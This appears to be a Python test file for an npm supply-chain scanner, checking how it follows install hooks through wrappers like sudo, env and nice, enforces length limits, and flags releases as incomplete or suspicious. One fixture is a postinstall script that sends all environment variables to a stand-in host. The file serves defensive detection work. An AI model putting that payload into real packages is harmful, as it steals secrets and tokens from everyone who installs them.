"""Following an install hook to the scripts it runs (core.follow_hook).

Review of the walk the registry (and --deps project scans) use:
* It was unbounded: a 16 MB hook of `cd a;` took hours (every `cd`
  normalized the whole path again), one of `env ` minutes (wrappers were
  popped off the front of a list), and one of `cd a && node b.js && …` made
  gigabytes of targets. A hook longer than HOOK_MAX_CHARS is not followed,
  at most HOOK_MAX_COMMANDS commands and HOOK_MAX_TARGETS scripts are, a
  script path longer than HOOK_MAX_PATH is dropped, and follow_hook says
  when a limit stopped it: the registry counts that release as not fully
  scanned (INCOMPLETE).
* It missed scripts behind a wrapper's options (`sudo -u me node x.js`,
  `env -i node x.js`, `env -u X node x.js`), after an fd number
  (`2>/dev/null node x.js`), and in `env -S "…"`; `env -C dir` / `sudo -D
  dir` run the command in dir; `node -e` / `-p` requires were not joined
  with the directory a `cd` moved to.
The native engine answers the same (tests/architecture/
test_rust_parity_hooks.py compares them; the npm package runs it as
WebAssembly). Commands are inert strings.
"""
import json
import time
import unittest

from lazaret.scanner import core
from tests.registry._review_support import issues, scan_npm


class FollowHookTests(unittest.TestCase):
    def test_wrappers_fd_numbers_and_node_code(self):
        cases = {
            "sudo -u me node x.js": ["x.js"], "sudo -E -H node x.js": ["x.js"], "sudo -- node x.js": ["x.js"],
            "env -i node x.js": ["x.js"], "env - node x.js": ["x.js"], "env -u X node x.js": ["x.js"],
            "env -uX node x.js": ["x.js"], "env --unset=X node x.js": ["x.js"],
            "env -C sub node x.js": ["sub/x.js"], "env -Csub node x.js": ["sub/x.js"],
            "sudo -D sub node x.js": ["sub/x.js"], "cd a && env --chdir ../b node x.js": ["b/x.js"],
            "env -C ~ node x.js": ["x.js"], "env -S \"node -r ./p.js x.js\"": ["x.js", "./p.js"],
            "env --split-string='cd lib && node z.js'": ["lib/z.js"],
            "nice -n 5 node x.js": ["x.js"], "nice -10 node x.js": ["x.js"], "time -o f.txt node x.js": ["x.js"],
            "exec -a name node x.js": ["x.js"], "dotenv -e .env -- node x.js": ["x.js"],
            "sudo -u me env -C sub A=1 node x.js": ["sub/x.js"],
            "2>/dev/null node x.js": ["x.js"], "1>out node x.js": ["x.js"], "2>&1 node x.js": ["x.js"],
            "node x.js 2> err.log": ["x.js"],
            "cd lib && node -e \"require('./x')\"": ["lib/x", "./x"],
            "cd lib && node -p \"require('../c')\"": ["c"],
            "node --eval=\"require('./b')\"": ["./b"],
            "node -e \"try{require('./postinstall')}catch(e){}\"": ["./postinstall"],     # core-js
        }
        for cmd, want in cases.items():
            with self.subTest(cmd=cmd):
                self.assertEqual(core.follow_hook(cmd), (want, True))
                self.assertEqual(core.hook_script_targets(cmd), want)

    def test_limits(self):
        cds = lambda n: "cd a; " * n + "node x.js"                       # noqa: E731
        self.assertEqual(core.follow_hook(cds(core.HOOK_MAX_COMMANDS - 1)),
                         (["a/" * (core.HOOK_MAX_COMMANDS - 1) + "x.js"], True))
        self.assertEqual(core.follow_hook(cds(core.HOOK_MAX_COMMANDS)), ([], False))
        targets, complete = core.follow_hook("; ".join(f"node s{n}.js" for n in range(core.HOOK_MAX_TARGETS + 5)))
        self.assertEqual((len(targets), targets[0], complete), (core.HOOK_MAX_TARGETS, "s0.js", False))
        self.assertEqual(core.follow_hook("node " + "a" * 5000 + ".js"), ([], False))
        self.assertEqual(core.follow_hook("x" * core.HOOK_MAX_CHARS), ([], True))
        self.assertEqual(core.follow_hook("x" * (core.HOOK_MAX_CHARS + 1)), ([], False))

    def test_long_hooks_are_quick(self):
        for unit in ("cd a; ", "env ", "cd a && node b.js && ", "a\\ ", "'x' "):
            cmd = unit * (core.HOOK_MAX_CHARS // len(unit))
            t = time.monotonic()
            core.follow_hook(cmd)
            self.assertLess(time.monotonic() - t, 5, unit)                 # well under a second when written


class RegistryTests(unittest.TestCase):
    def test_a_hook_beyond_the_limits_makes_the_release_incomplete(self):
        manifest = lambda cmd: json.dumps({"name": "x", "version": "1.0.0", "scripts": {"postinstall": cmd}})  # noqa: E731
        ok = scan_npm({"package.json": manifest("node x.js"), "x.js": "console.log(1);\n"})
        self.assertEqual(ok["verdict"], "WARN", ok["verdictReason"])
        for cmd in ("cd a; " * 1001 + "node x.js", "node x.js " + "x" * core.HOOK_MAX_CHARS):
            with self.subTest(cmd=cmd[:20]):
                res = scan_npm({"package.json": manifest(cmd), "x.js": "console.log(1);\n"})
                self.assertEqual(res["verdict"], "INCOMPLETE", res["verdictReason"])
                (trunc,) = issues(res, "SC-TRUNCATED")
                self.assertIn("install hook is more than Lazaret follows", trunc["msg"])

    def test_a_script_behind_a_wrapper_option_is_followed(self):
        hostile = "const t = JSON.stringify(process.env);\nrequire('https').request({host: 'collector.invalid'}).end(t);\n"
        res = scan_npm({"package.json": json.dumps({"name": "x", "version": "1.0.0",
                                                    "scripts": {"postinstall": "sudo -u me env -C lib node p.js"}}),
                        "lib/p.js": hostile})
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        (hook,) = issues(res, "SC-INSTALL-HOOK")
        self.assertEqual(hook["sev"], "CRITICAL")


if __name__ == "__main__":
    unittest.main()
